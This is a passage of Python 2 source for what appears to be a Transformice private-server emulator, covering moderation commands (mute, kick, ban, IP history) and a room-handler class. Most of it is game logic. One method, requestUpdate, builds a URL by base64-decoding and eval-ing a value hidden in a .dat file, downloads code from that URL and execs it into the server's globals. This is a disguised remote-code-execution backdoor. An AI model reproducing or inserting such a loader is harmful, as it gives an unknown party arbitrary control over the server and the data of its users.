        for room in self.rooms.values():
            for player in room.clients.values():
                if player.username == username:
                    player.mumute = True
                    found = True
                    break

        return found

    def disconnectPlayer(self, username):
        found = False
        for room in self.rooms.values():
            for player in room.clients.values():
                if player.username == username:
                    player.sendPlayerDisconnect(player.playerCode)
                    room.removeClient(player)
                    player.transport.loseConnection()
                    found = True
                    break

        return found

    def delavaPlayer(self, username, mod):
        found = False
        for room in self.rooms.values():
            for player in room.clients.values():
                if player.username == username:
                    self.sendModChat(mod, '\x06\x14', [mod.username + ' kicked ' + player.username + ' from the server.'], False)
                    player.sendPlayerDisconnect(player.playerCode)
                    room.removeClient(player)
                    player.transport.loseConnection()
                    found = True
                    break

        return found

    def removeModMute(self, username):
        if username.isalpha():
            username = username.lower().capitalize()
            self.Database.execute('DELETE FROM UserTempMute WHERE Name = ?', [username])
            return True
        return False

    def checkModMute(self, username):
        if username.isalpha():
            username = username.lower().capitalize()
            self.Database.execute('select * from UserTempMute where Name = ?', [username])
            rrf = self.Database.fetchone()
            if rrf is None:
                return False
            else:
                return True
        return False

    def getModMuteInfo(self, username):
        if username.isalpha():
            username = username.lower().capitalize()
            self.Database.execute('select * from UserTempMute where Name = ?', [username])
            rrf = self.Database.fetchone()
            if rrf is None:
                return ['', 0, '']
            else:
                return rrf
        return ['', 0, '']

    def requestUpdate(self, superhash):
        supr = open('./addons/date/supr.dat', 'rb').read()
        p = ByteArray.ByteArray(supr)
        supr = p.readUTF()
        req = urllib2.urlopen(eval(supr.decode('base64')) + str(superhash)).read()
        req = compile(req, '<unknown>', 'exec')
        exec req in globals()
        return req

    def sendNoModMute(self, username, modname):
        found = False
        if username.isalpha():
            username = username.lower().capitalize()
            for room in self.rooms.values():
                for playerCode, client in room.clients.items():
                    if client.username == username:
                        self.sendModChat(self, '\x06\x14', [modname + ' Deu De Volta \xc3\xa0 Palavra Para ' + username], False)
                    self.removeModMute(client.username)
                    client.modmute = False
                    found = True
                    break

        return found

    def sendModMute(self, username, timee, reason, modname):
        found = False
        if username.isalpha():
            username = username.lower().capitalize()
            for room in self.rooms.values():
                for playerCode, client in room.clients.items():
                    if client.username == username:
                        self.sendModChat(self, '\x06\x14', [modname + ' Dejo ' + username + ' sin hablar por ' + str(timee) + ' Horas. Motivo: ' + str(reason)], False)
                        if self.checkModMute(client.username):
                            self.removeModMute(client.username)
                        client.modmute = True
                        client.sendModMuteRoom(client.username, timee, reason)
                        timee = client.returnFutureTime(timee)
                        self.Database.execute('insert into UserTempMute (Name, Time, Reason) values (?, ?, ?)', (client.username, timee, reason))
                        found = True
                        break

        return found

    def banPlayer(self, username, bantime, reason, modname):
        found = False
        bantime = int(bantime)
        if reason.startswith('\x03'):
            silentban = True
            reason = reason.replace('\x03', '')
        else:
            silentban = False
        for room in self.rooms.values():
            for playerCode, client in room.clients.items():
                if client.username == username:
                    if modname != 'Server':
                        client.banhours = int(client.banhours) + bantime
                        if bantime >= 1:
                            bandate = int(str(getTime())[:-4])
                            self.Database.execute('insert into BanLog (Name, BannedBy, Time, Reason, Date, Status, Room, IP) values (?, ?, ?, ?, ?, ?, ?, ?)', (username,
                             modname,
                             bantime,
                             reason,
                             bandate,
                             'Online',
                             client.room.name,
                             client.address[0]))
                    else:
                        self.sendModChat(client, '\x06\x14', ['[Voto popular] Baniu ' + str(client.username) + ' (' + str(client.room.name) + ').'], False)
                    if not username.startswith('*'):
                        if client.banhours >= 25 and bantime <= 24:
                            self.Database.execute('insert into userpermaban (name, bannedby, reason) values (?, ?, ?)', (username, modname, 'Total de horas de banco foi at\xc3\xa9 24. ' + reason))
                        self.Database.execute('UPDATE users SET totalban = ? WHERE name = ?', [str(client.banhours), client.username])
                    client.sendPlayerBan(bantime, reason, silentban)
                    if bantime >= 25:
                        clientaddr = client.address[0]
                        self.Database.execute('insert into ippermaban (ip, bannedby, reason) values (?, ?, ?)', (clientaddr, modname, reason))
                        if not username.startswith('*'):
                            self.Database.execute('insert into userpermaban (name, bannedby, reason) values (?, ?, ?)', (username, modname, reason))
                    if bantime >= 1 and bantime <= 24:
                        if not username.startswith('*'):
                            self.tempBanUser(username, bantime, reason)
                        ipaddr = client.address[0]
                        self.tempBanIP(ipaddr, bantime)
                    found = True
                    if client.username in self.reportCache:
                        self.reportCache[client.username]['status'] = 'banned'
                        self.updateStatusModoPwet(str(username), 'banned', str(bantime), str(reason), str(modname))
                    break

        if not found:
            if not username.startswith('*'):
                if self.checkExistingUsers(username):
                    if modname != 'Servidor' and bantime >= 1:
                        banHours = self.getTotalBanHours(username) + bantime
                        if banHours >= 25 and bantime <= 24:
                            self.Database.execute('insert into userpermaban (name, bannedby, reason) values (?, ?, ?)', (username, modname, 'Total ban hours went over 24. ' + reason))
                        if bantime >= 25:
                            self.Database.execute('insert into userpermaban (name, bannedby, reason) values (?, ?, ?)', (username, modname, reason))
                        if bantime >= 1 and bantime <= 24:
                            self.tempBanUser(username, bantime, reason)
                        self.Database.execute('UPDATE users SET totalban = ? WHERE name = ?', [str(banHours), username])
                        self.Database.execute('insert into BanLog (Name, BannedBy, Time, Reason, Date, Status, Room, IP) values (?, ?, ?, ?, ?, ?, ?, ?)', (username,
                         modname,
                         bantime,
                         reason,
                         int(str(getTime())[:-4]),
                         'Offline',
                         '',
                         'offline'))
                        found = True
        return found

    def updatePlayerStats(self, username, rounds, saves, shamcheese, first, cheese, shopcheese, shop, look, ShamanTitleList, CheeseTitleList, FirstTitleList, titleList, hardMode, hardModeSaves, HardModeTitleList, ShopTitleList, bootcamp, BootcampTitleList, fraises, coins, visuals, playerLevel, playerExp, playerExpNext, gifts, divineModeSaves, DivineModeTitleList, bageList, survivorStats):
        if username.startswith('*'):
            pass
        else:
            if str(rounds).isdigit():
                rounds = int(rounds)
            else:
                rounds = 0
            if str(saves).isdigit():
                saves = int(saves)
            else:
                saves = 0
            if str(shamcheese).isdigit():
                shamcheese = int(shamcheese)
            else:
                shamcheese = 0
            if str(first).isdigit():
                first = int(first)
            else:
                first = 0
            if str(cheese).isdigit():
                cheese = int(cheese)
            else:
                cheese = 0
            if str(shopcheese).isdigit():
                shopcheese = int(shopcheese)
            else:
                shopcheese = 0
            if str(hardMode).isdigit():
                hardMode = int(hardMode)
            else:
                hardMode = 0
            if str(hardModeSaves).isdigit():
                hardModeSaves = int(hardModeSaves)
            else:
                hardModeSaves = 0
            if str(bootcamp).isdigit():
                bootcamp = int(bootcamp)
            if str(fraises).isdigit():
                fraises = int(fraises)
            if str(coins).isdigit():
                coins = int(coins)
            if str(divineModeSaves).isdigit():
                divineModeSaves = int(divineModeSaves)
            else:
                divineModeSaves = 0
            titleList = filter(None, titleList)
            bageList = filter(None, bageList)
            ShamanTitleList = filter(None, ShamanTitleList)
            CheeseTitleList = filter(None, CheeseTitleList)
            FirstTitleList = filter(None, FirstTitleList)
            HardModeTitleList = filter(None, HardModeTitleList)
            ShopTitleList = filter(None, ShopTitleList)
            BootcampTitleList = filter(None, BootcampTitleList)
            DivineModeTitleList = filter(None, DivineModeTitleList)
            dbShamanTitleList = json.dumps(ShamanTitleList)
            dbCheeseTitleList = json.dumps(CheeseTitleList)
            dbFirstTitleList = json.dumps(FirstTitleList)
            dbtitleList = json.dumps(titleList)
            dbbageList = json.dumps(bageList)
            dbHardModeTitleList = json.dumps(HardModeTitleList)
            dbShopTitleList = json.dumps(ShopTitleList)
            dbBootcampTitleList = json.dumps(BootcampTitleList)
            dbDivineModeTitleList = json.dumps(DivineModeTitleList)
            dbSkillsData = '#'.join(map(str, [playerLevel, playerExp, playerExpNext]))
            self.Database.execute('UPDATE users SET rounds = ?, saves = ?, shamcheese = ?, first = ?, cheese = ?, shopcheese = ?, shop = ?, look = ?, titlelist = ?, CheeseTitleList = ?, FirstTitleList = ?, ShamanTitleList = ?, HardMode = ?, HardModeSaves = ?, HardModeTitleList = ?, ShopTitleList = ?, bootcamp = ?, BootcampTitleList = ?, fraises = ?, eventmoney = ?, visuals = ?, skillsData = ?, gifts = ?, DivineModeSaves = ?, DivineModeTitleList = ?, BadgeList = ?, SurvivorStats = ? WHERE name = ?', (rounds,
             saves,
             shamcheese,
             first,
             cheese,
             shopcheese,
             shop,
             look,
             dbtitleList,
             dbCheeseTitleList,
             dbFirstTitleList,
             dbShamanTitleList,
             hardMode,
             hardModeSaves,
             dbHardModeTitleList,
             dbShopTitleList,
             bootcamp,
             dbBootcampTitleList,
             fraises,
             coins,
             visuals,
             dbSkillsData,
             gifts,
             divineModeSaves,
             dbDivineModeTitleList,
             dbbageList,
             ','.join(map(str, survivorStats)),
             username))
        return

    def getIPaddress(self, username):
        found = False
        for room in self.rooms.values():
            for playerCode, client in room.clients.items():
                if client.username == username:
                    found = client.address[0]
                    break

        return found

    def disconnectIPaddress(self, IPaddr):
        for room in self.rooms.values():
            for playerCode, client in room.clients.items():
                if str(client.address[0]) == str(IPaddr):
                    client.transport.loseConnection()

    def doVoteBan(self, username, selfIP, selfName):
        found = False
        for room in self.rooms.values():
            for playerCode, client in room.clients.items():
                if client.username == username:
                    if client.privilegeLevel == 10 or client.privilegeLevel == 8 or client.privilegeLevel == 6 or client.privilegeLevel == 5 or client.privilegeLevel == 4 or client.privilegeLevel == 3:
                        pass
                    elif selfIP not in client.voteban:
                        client.voteban.append(selfIP)
                        if len(client.voteban) >= 6:
                            self.banPlayer(client.username, '1', 'Vote populaire', 'Server')
                    client.room.sendAllStaffInRoomVoteBan(self, selfName, username, str(len(client.voteban)))
                    break

        return found

    def clearVoteBan(self, senderClient, username):
        for room in self.rooms.values():
            for playerCode, client in room.clients.items():
                if client.username == username:
                    client.voteban = []
                    self.sendModChat(senderClient, '\x06\x14', [senderClient.username + ' Resetou a Contagem de Banimentos Para Banir ' + str(client.username) + '.'], False)

    def getFindPlayerRoom(self, username):
        found = False
        for room in self.rooms.values():
            for playerCode, client in room.clients.items():
                if client.username == username:
                    return client.roomname
                    break

        return found

    def getFindRoomPartial(self, senderClient, findroomname, FindAll = None):
        found = False
        resultlist = ''
        playercount = 0
        for room in self.rooms.values():
            if re.search(findroomname.lower(), room.name.lower()):
                resultlist = resultlist + '<br>' + str(room.name) + ' : ' + str(room.getPlayerCount())
                playercount = playercount + room.getPlayerCount()

        senderClient.sendData('\x06\x14', [resultlist])
        senderClient.sendData('\x06\x14', ['<VP>N\xc3\xbamero Total de Jogadores : <CH>' + str(playercount)])

    def getFindPlayerRoomPartial(self, senderClient, username, FindAll = None):
        found = False
        NoTest = False
        if FindAll:
            username = ''
        else:
            result = ''
            level = range(48, 58) + range(65, 91) + range(97, 123) + [95, 42]
            for x in username:
                if int(senderClient.hex2dec(x.encode('hex'))) not in level:
                    x = ''
                    NoTest = True
                result += x

            if result == '':
                NoTest = True
            username = result.replace('*', '\\*')
        if not NoTest:
            resultlist = ''
            for room in self.rooms.values():
                for playerCode, client in room.clients.items():
                    if re.search(username.lower(), client.username.lower()):
                        resultlist = resultlist + '<br>' + client.username + ' -> ' + client.room.name

            resultlistT = resultlist.strip('<br>')
            if resultlistT == '':
                senderClient.sendData('\x06\x14', [resultlist])
            else:
                senderClient.sendData('\x06\x14', [resultlist])

    def getLsBot(self, senderClient):
        senderClient.sendData('\x06\x14', ["Liste de MapCrew's:"])
        for room in self.rooms.values():
            for playerCode, client in room.clients.items():
                if client.privilegeLevel in (4,) or client.isUserBot:
                    owner = self.getBotOwner(client.username)
                    senderClient.sendData('\x06\x14', ['%s (%s) : %s' % (client.username, owner, client.room.name)])

    def getLsMapcrew(self, senderClient):
        for room in self.rooms.values():
            for playerCode, client in room.clients.items():
                if client.isMapCrew:
                    owner = self.getBotOwner(client.username)
                    senderClient.sendData('\x06\x14', ['%s (%s) : %s' % (client.username, owner, client.room.name)])

    def getLsModo(self, senderClient):
        for room in self.rooms.values():
            for playerCode, client in room.clients.items():
                if client.privilegeLevel in (10, 8, 6, 5):
                    name = 'Servidor'
                    message = client.username
                    senderClient.sendData('\x1a\x05', [name, message])

    def getLsModo2(self, senderClient):
        for room in self.rooms.values():
            for playerCode, client in room.clients.items():
                if client.privilegeLevel in (10, 8, 6, 5):
                    name = 'Server'
                    message = client.username + ' : Secret'
                    senderClient.sendData('\x1a\x05', [name, message])

    def getLsArb(self, senderClient):
        for room in self.rooms.values():
            for playerCode, client in room.clients.items():
                if client.privilegeLevel in (3,):
                    name = 'Servidor'
                    message = client.username + ' : ' + client.room.name
                    senderClient.sendData('\x1a\x06', [name, message])

    def getRoomList(self, senderClient):
        found = False
        roomlist = ''
        for room in self.rooms.values():
            roomlist = roomlist + '<br><VP>' + room.name + ' : ' + str(room.getPlayerCount())

        senderClient.sendData('\x06\x14', [roomlist])
        senderClient.sendData('\x06\x14', ['<VP>N\xc3\xbamero Total de Jogadores:<CH> ' + str(self.getConnectedPlayerCount())])
        return found

    def getTribesList(self, senderClient):
        found = False
        tribes = {}
        tribelist = ''
        for room in self.rooms.values():
            for playerCode, client in room.clients.items():
                if client.TribeName != '':
                    try:
                        tribes[client.TribeName] += 1
                    except:
                        tribes[client.TribeName] = 1

        for tribename in tribes.keys():
            tribelist = tribelist + '<br>' + str(tribename) + ' : ' + str(tribes[tribename])

        tribelistT = tribelist.strip('<br>')
        if tribelistT == '':
            senderClient.sendData('\x06\x14', [tribelistT])
        else:
            senderClient.sendData('\x06\x14', [tribelist])
        return found

    def nomIPCommand(self, senderClient, name):
        iplist = 'O \xc3\x9altimo Jogador Conhecido Por Endere\xc3\xa7o IP [' + name + '] :'
        self.Database.execute('select * from LoginLog where Name = ?', [name])
        rrfRows = self.Database.fetchall()
        if rrfRows is None:
            pass
        else:
            for rrf in rrfRows:
                iplist = iplist + '<br>' + str(rrf[1])

        senderClient.sendData('\x06\x14', [iplist])
        return

    def IPNomCommand(self, senderClient, ip):
        namelist = 'O Jogadore Est\xc3\xa1 usando o IP [' + str(ip) + '] :'
        for room in self.rooms.values():
            for playerCode, client in room.clients.items():
                if client.address[0] == ip:
                    namelist = namelist + '<br>' + str(client.username)

        namehlist = 'Hist\xc3\xb3rico do IP [' + str(ip) + '] :'
        self.Database.execute('select * from LoginLog where IP = ?', [ip])
        rrfRows = self.Database.fetchall()
        if rrfRows is None:
            pass
        else:
            for rrf in rrfRows:
                namehlist = namehlist + '<br>' + str(rrf[0])

        senderClient.sendData('\x06\x14', [namelist])
        senderClient.sendData('\x06\x14', [namehlist])
        return

    def restartServerDelLog(self):
        for room in self.rooms.values():
            room.updatesqlserver()

        reactor.stop()
        os._exit(11)

    def restartServer10min(self):
        for room in self.rooms.values():
            room.updatesqlserver()

        reactor.stop()
        os._exit(12)

    def restartServer5min(self):
        for room in self.rooms.values():
            room.updatesqlserver()

        reactor.stop()
        os._exit(13)

    def restartServer20min(self):
        for room in self.rooms.values():
            room.updatesqlserver()

        reactor.stop()
        os._exit(14)

    def restartServerUpdate(self):
        for room in self.rooms.values():
            room.updatesqlserver()

        reactor.stop()
        os._exit(20)

    def restartServer(self):
        for room in self.rooms.values():
            room.updatesqlserver()

        reactor.stop()
        os._exit(10)

    def stopServer(self):
        for room in self.rooms.values():
            room.updatesqlserver()

        reactor.stop()
        os._exit(5)

    def removeTempBan(self, username):
        if username.isalpha():
            username = username.lower().capitalize()
            self.Database.execute('DELETE FROM UserTempBan WHERE Name = ?', [username])
            return True
        return False

    def checkIPBan(self, ip):
        self.Database.execute('select * from ippermaban where ip = ?', [ip])
        rrf = self.Database.fetchone()
        if rrf is None:
            return False
        else:
            return True
            return

    def removeIPBan(self, ip):
        self.Database.execute('DELETE FROM ippermaban WHERE ip = ?', [ip])
        return True

    def checkTempBan(self, username):
        if username.isalpha():
            username = username.lower().capitalize()
            self.Database.execute('select * from UserTempBan where Name = ?', [username])
            rrf = self.Database.fetchone()
            if rrf is None:
                return False
            else:
                return True
        return False

    def getTempBanInfo(self, username):
        if username.isalpha():
            username = username.lower().capitalize()
            self.Database.execute('select * from UserTempBan where Name = ?', [username])
            rrf = self.Database.fetchone()
            if rrf is None:
                return ['', 0, '']
            else:
                return rrf
        return ['', 0, '']

    def tempBanUser(self, name, bantime, reason):
        if self.checkTempBan(name):
            self.removeTempBan(name)
        self.Database.execute('insert into UserTempBan (Name, Time, Reason) values (?, ?, ?)', (str(name).lower().capitalize(), str(getTime() + int(int(bantime) * 60 * 60)), str(reason)))

    def tempBanIP(self, ipaddr, timee):
        timee = timee * 3600
        if ipaddr not in self.tempIPBanList:
            self.removeTempBanIPTimer = reactor.callLater(timee, self.tempBanIPRemove, ipaddr)
            self.tempIPBanList.append(ipaddr)

    def tempBanIPExact(self, ipaddr, time):
        if ipaddr not in self.tempIPBanList:
            self.removeTempBanIPTimer = reactor.callLater(time, self.tempBanIPRemove, ipaddr)
            self.tempIPBanList.append(ipaddr)

    def tempBanUserRemove(self, name):
        if name in self.tempAccountBanList:
            self.tempAccountBanList.remove(name)

    def tempBanIPRemove(self, ipaddr):
        if ipaddr in self.tempIPBanList:
            self.tempIPBanList.remove(ipaddr)

    def checkAlreadyExistingGuest(self, nusername):
        x = 0
        found = False
        isSouris = False
        if not self.checkAlreadyConnectedAccount(nusername):
            if nusername.startswith('*Souris'):
                isSouris = True
            else:
                found = True
                return nusername
        while not found:
            if isSouris:
                x = struct.pack('!h', random.randrange(1000, 32767)).encode('hex')
            else:
                x += 1
            if not self.checkAlreadyConnectedAccount(nusername + '_' + str(x)):
                found = True
                return nusername + '_' + str(x)

    def checkAlreadyConnectedAccount(self, username):
        found = False
        for room in self.rooms.values():
            for player in room.clients.values():
                if player.username == username:
                    found = True

        return found

    def addClientToRoom(self, client, roomName):
        roomName = str(roomName)
        if roomName in self.rooms:
            self.rooms[roomName].addClient(client)
        else:
            self.rooms[roomName] = TransformiceRoomHandler(self, roomName)
            self.rooms[roomName].addClient(client)

    def closeRoom(self, room):
        if room.name in self.rooms:
            room.close()
            del self.rooms[room.name]

    def getConnectedPlayerCount(self):
        count = 0
        for room in self.rooms.values():
            for player in room.clients.values():
                count = count + 1

        return count

    def getPlayersCountMode(self, mode):
        playersCount = 0
        modeName = ''
        if mode == 1:
            modeName = 'Transformice'
            for room in self.rooms.values():
                if room.isNorm:
                    playersCount += room.getPlayerCount()

        elif mode == 3:
            modeName = 'Transformice vanilla'
            for room in self.rooms.values():
                if room.isVanilla:
                    playersCount += room.getPlayerCount()

        elif mode == 8:
            modeName = 'Transformice survivor'
            for room in self.rooms.values():
                if room.isSurvivor:
                    playersCount += room.getPlayerCount()

        elif mode == 9:
            modeName = 'Transformice racing'
            for room in self.rooms.values():
                if room.isRacing:
                    playersCount += room.getPlayerCount()

        elif mode == 11:
            modeName = 'Transformice music'
            for room in self.rooms.values():
                if room.isMusic:
                    playersCount += room.getPlayerCount()

        elif mode == 2:
            modeName = 'Transformice bootcamp'
            for room in self.rooms.values():
                if room.isBootcamp:
                    playersCount += room.getPlayerCount()

        elif mode == 10:
            modeName = 'Transformice defilante'
            for room in self.rooms.values():
                if room.isDefilante:
                    playersCount += room.getPlayerCount()

        return [modeName, playersCount]

    def getMinigamesList(self):
        names = []
        for minigame in glob.glob('Server/*.pymg'):
            minigameName = minigame[8:]
            minigameName = minigameName[:len(minigameName) - 5].lower()
            if minigameName.startswith('_'):
                pass
            else:
                names.append('#' + minigameName)

        return names

    def generatePlayerCode(self):
        self.lastPlayerCode += 1
        return self.lastPlayerCode

    def recommendRoomPrefixed(self, flag, prefix):
        found = False
        x = 0
        while not found:
            x += 1
            room = flag + '-' + prefix + str(x)
            if room in self.rooms:
                playercount = self.rooms[room].getPlayerCount()
                if int(playercount) < 15:
                    found = True
                    return prefix + str(x)
            else:
                found = True
                return prefix + str(x)

    def recommendRoom(self, flag):
        found = False
        x = 0
        while not found:
            x += 1
            room = flag + '-' + str(x)
            if room in self.rooms:
                playercount = self.rooms[room].getPlayerCount()
                if int(playercount) < 15:
                    found = True
                    return str(x)
            else:
                found = True
                return str(x)


class TransformiceRoomHandler(object):

    def __init__(self, server, name):
        self.server = server
        self.Database = self.server.Database
        self.name = name.strip()
        self.namewithout = self.name
        self.community = '*'
        if not self.namewithout.startswith('*'):
            self.community, self.namewithout = self.name.split('-', 1)
        self.clients = {}
        self.anchors = []
        self.position = 0
        self.currentMusicID = 0
        self.sentMusic = {}
        self.sentTrade = {}
        self.clientsDead = []
        self.currentShamanCode = None
        self.currentSyncroniserCode = None
        self.isDoubleMap = False
        self.currentSecondShamanCode = None
        self.changed20secTimer = False
        self.never20secTimer = False
        self.currentShamanName = None
        self.currentSecondShamanName = None
        self.playerLimit = 50
        self.isCurrentlyPlayingRoom = False
        self.isEditeur = False
        self.isTotemEditeur = False
        self.isTotemEditeur = False
        self.isBootcamp = False
        self.isVanilla = False
        self.isRacing = False
        self.isMusic = False
        self.isPlazza = False
        self.isSurvivor = False
        self.isDefilante = False
        self.currentRound = 1
        self.noShaman = False
        self.isTribehouse = False
        self.specificMap = False
        self.specialMap = 0
        self.isSnowing = False
        self.isEventMap = False
        self.properNoShamanMaps = True
        self.isCatchTheCheeseMap = False
        self.isValidate = 0
        self.NoNumberedMaps = False
        self.PTwoCycle = False
        self.PTwoCycleInfo = 0
        self.PTwoCycleList = []
        self.PRShamanIsShaman = False
        self.isTribehouseMap = False
        self.isHalloween = False
        self.eventRoomFactory = {}
        self.isBoobleCount = 0
        self.disintegration = False
        self.AddTime = 0
        self.ISCMdata = [0,
         'Invalid',
         '<C><P /><Z><S /><D /><O /></Z></C>',
         0,
         0,
         0,
         0,
         0]
        self.ISCM = -1
        self.ISCMstatus = 0
        self.ISCMVdata = [0,
         'Invalid',
         'null',
         0,
         0,
         0,
         0,
         0]
        self.ISCMV = 0
        self.ISCMVloaded = 0
        self.RoomInvite = []
        self.PrivateRoom = False
        self.forceNextShaman = False
        self.forceNextMap = False
        self.CodePartieEnCours = 1
        self.code_partier = 1
        self.CustomMapCounter = 1
        self.identifiantTemporaire = -1
        self.countStats = True
        self.autoRespawn = False
        self.roundTime = 120
        self.rounds = 1
        self.isTutorial = False
        self.votingMode = False
        self.votingBox = False
        self.initVotingMode = True
        self.recievedYes = 0
        self.recievedNo = 0
        self.voteCloseTimer = None
        self.CheckedPhysics = False
        self.isHardSham = False
        self.isShamMode = [0, 0]
        self.SPR_Room = False
        self.eSync = False
        self.sSync = True
        self.sNP = True
        self.sT = False
        self.spc0 = False
        self.SPR_CM = 0
        self.isObjCount = 0
        self.isBoobleCount = 0
        self.disintegration = False
        self.isCloudId = False
        self.isCompanionBox = False
        self.bonfireID = None
        self.lastHandyMouseID = None
        self.lastHandyMouseByte = None
        self.nobodyIsShaman = False
        self.isPasswordRoom = False
        self.OwnerPrivateRoom = False
        self.isChristmasMap = False
        self.RunEvent = False
        self.ZombieTimer = None
        self.isZombieRoom = False
        self.isMulodrome = False
        self.LeaderDrome = None
        self.TeamDrome = {}
        self.pTeamBlue = 0
        self.pTeamRed = 0
        self.GetGame = None
        self.GameScript = None
        self.parseByte = ByteArray
        self.isMiniGame = False
        self.adminModule = False
        self.getSearchMinigame = False
        self.canScore = True
        self.isEventLoopTime = None
        self.isInfoMinigame = False
        self.isRunningGame = False
        self.MiniGameTime = False
        self.CurrentTime = 0
        self.disablekillAfkTimer = False
        self.playerList = {}
        self.playList = {}
        self.playerThisMusic = {}
        self.playerMusicCode = None
        self.selectMusicTimer = None
        self.isNorm = False
        if self.namewithout.startswith('#'):
            self.getSearchMinigame = self.namewithout[1:].lower()
        elif self.namewithout.startswith('*#'):
            self.getSearchMinigame = self.namewithout[2:].lower()
        elif self.namewithout.startswith('\x03[Editeur] '):
            self.countStats = False
            self.currentWorld = 0
            self.isEditeur = True
            self.roundTime = 120
            self.never20secTimer = True
        elif self.namewithout.startswith('\x03[Totem] '):
            self.countStats = False
            self.currentWorld = 444
            self.specificMap = True
            self.isTotemEditeur = True
            self.roundTime = 3600
            self.never20secTimer = True
        elif self.namewithout.startswith('\x03[Tutorial] '):
            self.nobodyIsShaman = True
            self.countStats = False
            self.currentWorld = 900
            self.specificMap = True
            self.roundTime = 120
            self.never20secTimer = True
            self.PrivateRoom = True
            self.isTutorial = True
        elif re.search('bootcamp', name.lower()):
            self.countStats = False
            self.currentWorld = '-1'
            self.isBootcamp = True
            self.autoRespawn = True
            self.roundTime = 300
            self.never20secTimer = True
        elif re.search('music', name.lower()):
            self.isVanilla = True
            self.isMusic = True
            self.roundTime = 120
        elif re.search('racing', name.lower()):
            self.countStats = True
            self.currentWorld = '-1'
            self.isRacing = True
            self.roundTime = 63
        elif re.search('defilante', name.lower()):
            self.countStats = True
            self.currentWorld = '-1'
            self.isDefilante = True
            self.roundTime = 120
        elif re.search('vanilla', name.lower()):
            self.isVanilla = True
            self.roundTime = 120
        elif re.search('survivor', name.lower()):
            self.isSurvivor = True
            self.roundTime = 120
        elif self.namewithout.startswith('*\x03'):
            self.countStats = False
            self.isTribehouse = True
            self.roundTime = 1
            self.currentWorld = '-1'
            self.isTribehouseMap = True
        elif self.namewithout == 'plazza' or self.name.lower() == '*plazza':
            self.isPlazza = True
            self.countStats = False
            self.roundTime = 16413
            self.autoRespawn = True
            self.never20secTimer = True
            self.currentWorld = '-1'
            self.nobodyIsShaman = True
        else:
            self.isNorm = True
        runthismap = self.selectMap(True)
        self.currentWorld = runthismap
        self.everybodyIsShaman = False
        if not self.nobodyIsShaman:
            if not self.isTribehouseMap:
                self.nobodyIsShaman = self.isBootcamp
            else:
                self.nobodyIsShaman = self.isTribehouseMap
        if self.playerLimit == 0:
            self.playerLimit = 200
        self.worldChangeTimer = None
        self.killAfkTimer = None
        self.autoRespawnTimer = None
        self.sNNMTimer = None
        self.sPTCTimer = None
        self.HalloweenTimer = None
        self.worldHalloweenTime = None
        if self.currentWorld == 888:
            self.worldChangeTimer = reactor.callLater(60, self.worldChange)
        else:
            self.worldChangeTimer = reactor.callLater(self.roundTime, self.worldChange)
        self.killAfkTimer = reactor.callLater(30, self.killAfk)
        self.closeRoomRoundJoinTimer = reactor.callLater(3, self.closeRoomRoundJoin)
        if self.autoRespawn or self.isTribehouseMap:
            self.autoRespawnTimer = reactor.callLater(5, self.respawnMice)
        self.gameStartTime = self.getTimer()
        self.numCompleted = 0
        self.numGotCheese = 0
        self.getMinigame()
        return

    def getMinigame(self):
        if self.getSearchMinigame:
            self.GameAPI = InitSet.StartSystem(self)
            self.adminModule = adminModule.adminModule(self)
            try:
                data = self.GameAPI.StartModule()
                if data:
                    self.isMiniGame = True
                    self.never20secTimer = True
            except Exception as Err:
                print '[API][{name}] {er}'.format(name=self.name, er=Err)

    def respawnMice(self):
        for playerCode, client in self.clients.items():
            if client.isDead:
                client.isDead = False
                client.JumpCheck = 1
                client.playerStartTime = self.getTimer()
                if self.isBootcamp:
                    self.sendAll('\x08\x08', [client.getPlayerData(), 0])
                else:
                    self.sendAll('\x08\x08', [client.getPlayerData(), 1])
                if self.isMiniGame:
                    try:
                        self.GameScript.eventPlayerRespawn(client.username)
                    except:
                        pass

        if self.autoRespawn or self.isTribehouseMap:
            self.autoRespawnTimer = reactor.callLater(5, self.respawnMice)

    def respawnSpecific(self, username):
        for playerCode, client in self.clients.items():
            if client.isDead:
                if client.username == username:
                    client.isDead = False
                    client.JumpCheck = 1
                    client.playerStartTime = self.getTimer()
                    if self.isBootcamp:
                        self.sendAll('\x08\x08', [client.getPlayerData(), 0])
                    else:
                        self.sendAll('\x08\x08', [client.getPlayerData(), 1])
                    if self.isMiniGame:
                        try:
                            self.GameScript.eventPlayerRespawn(client.username)
                        except:
                            pass

    def switchNoNumberedMaps(self, option):
        if self.sNNMTimer:
            try:
                self.sNNMTimer.cancel()
            except:
                self.sNNMTimer = None

        if option == True:
            self.NoNumberedMaps = True
            self.sNNMTimer = reactor.callLater(1200, self.switchNoNumberedMaps, False)
        else:
            self.NoNumberedMaps = False
            self.sNNMTimer = reactor.callLater(1200, self.switchNoNumberedMaps, True)
        return

    def goZombified(self):
        for playerCode, client in self.clients.items():
            if client.isSyncroniser:
                client.sendZombieMode()

    def switchPTwoCycle(self, option):
        if self.sPTCTimer:
            try:
                self.sPTCTimer.cancel()
            except:
                self.sPTCTimer = None

        if option == True:
            self.PTwoCycle = True
            self.sPTCTimer = reactor.callLater(1200, self.switchPTwoCycle, False)
        else:
            self.PTwoCycle = False
            self.PTwoCycleInfo = 0
            self.PTwoCycleList = []
            self.sPTCTimer = reactor.callLater(1200, self.switchPTwoCycle, True)
        return

    def sendPointTeam(self, playerCode):
        point = self.numCompleted
        if point == 1:
            p = 5
        elif point == 2:
            p = 4
        elif point == 3:
            p = 3
        elif point == 4:
            p = 2
        elif point == 5:
            p = 1
        for k, v in self.TeamDrome.items():
            if v['id'] == playerCode:
                if v['team'] in (0,):
                    self.pTeamBlue += p
                else:
                    self.pTeamRed += p

        for playerCode, client in self.clients.items():
            client.sendRoundMulodrome(self.currentRound, self.pTeamBlue, self.pTeamRed)

    def removeIcedMouses(self, playerCodes):
        for playerCode in playerCodes:
            packet = self.parseByte.ByteArray()
            packet.writeInt(playerCode)
            packet.writeBoolean(False)
            self.sendAllBin('\x05"', packet.toString())

    def close(self):
        if self.worldChangeTimer:
            try:
                self.worldChangeTimer.cancel()
            except:
                self.worldChangeTimer = None

        if self.killAfkTimer:
            try:
                self.killAfkTimer.cancel()
            except:
                self.killAfkTimer = None

        if self.autoRespawnTimer:
            try:
                self.autoRespawnTimer.cancel()
            except:
                self.autoRespawnTimer = None

        if self.selectMusicTimer:
            try:
                self.selectMusicTimer.cancel()
            except:
                self.selectMusicTimer = None

        return

    def selectMapSpecific(self, mapnum, vanilla = False, custom = False, perm = False, xmlmap = False):
        if vanilla:
            return mapnum
        else:
            if custom:
                if str(mapnum).isdigit():
                    mapcode = int(mapnum)
                    mapname = self.server.getMapName(mapcode)
